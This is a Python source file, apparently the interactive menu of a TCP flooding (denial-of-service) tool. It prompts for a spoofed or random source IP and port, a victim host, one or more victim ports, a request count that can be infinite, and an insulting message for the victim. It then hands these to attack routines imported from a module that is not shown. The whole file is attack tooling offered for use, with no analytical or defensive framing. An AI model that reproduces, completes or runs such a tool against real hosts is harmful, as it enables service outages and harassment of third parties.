def main():
    try:
        import socket
        import os
        from os import path
        import sys
        if os.name == 'nt':
            from colorama import init
            init(convert=True)
        sys.path.insert(0, path.dirname(path.dirname(path.dirname(__file__))))
        from Core import Color, RandomIp, RandomInt, SS, SM, AskFor,Notify
        black, red, green, yellow, blue, magenta, cyan, grey, reset = Color().GetAllColors()
        print(
            "What is The Type For Now Only TCP Supported : \n"
            "* = Not Supported right now\n"
            + red + "{1}--> SS (Single Ip , Single Port)\n"
            + green + "{2}--> SM (Single Ip , Multiple Ports)\n"
            + blue + "{3}--> MS (Multiple Ips , Single Ports*)\n"
            + yellow + "{4}--> MM (Multiple Ips , Multiple Ports*)\n"
            + magenta + "{000}--> Back To Main Menu" + reset

        )
        CHOICE = str(input("..> "))
        if CHOICE == "000":
            pass
        elif CHOICE == "1" or CHOICE == "2":

            SOURCE_IP = AskFor(
                "Whats The Ip Address You Want To Attack From . " +
                "Press Enter(Left Empty) To Use A Random Ip : ", 'Using \\| As Source Ip.', default=['', RandomIp], args=())

            temp = int(RandomInt(1100, 4000))
            SOURCE_PORT = AskFor("Whats The Port You Want To Attack From "
                                 "Left To '-1' To Use A Random Port : ", "Using \\| As Source Port.", type=int, default=[-1, temp], args=())

            VICTIM_IP = AskFor("Whats The Host, Name Or IP You Want To Attack To : ",
                               "Using Ip Or Hostname \\| As Victim Ip")
            # SS
            if CHOICE == "1":
                VICTIM_PORT = AskFor(
                                    "Whats The Port You Want To Attack To . Left to -1 To Use 80 : ", 
                                    "Using \\| As Victim Port.", type=int, default=[-1, 80])
            elif CHOICE == "2":
                VICTIM_PORTS = AskFor(
                                    "What Are The Ports You Want To Attack To . Press Enter (Left Empty) To Use [80, 443] : ", 
                                    "Using \\| As Victim Ports.", type=list, default=['', [80, 443]])

    
            COUNT = AskFor("How Much Requests Do You Want To Send (-1 For Infinite) : ", "Count Is \\|")
            MESSAGE = AskFor("A Message For Your Victim Press Enter (Left Empty) To Use 'Fuck You' : ", "Using \\| As A Message For Victim", default=['', 'Fuck You'])
            if CHOICE == "1":
                SS.run(
                    SOURCE_IP, VICTIM_IP, int(SOURCE_PORT), int(VICTIM_PORT), int(COUNT), MESSAGE
                )
            elif CHOICE == "2":
                SM.run(
                    SOURCE_IP, VICTIM_IP, int(SOURCE_PORT), VICTIM_PORTS, int(COUNT), MESSAGE
                )
    except (EOFError, KeyboardInterrupt):
        Notify("report", "User Requested An Exit.")
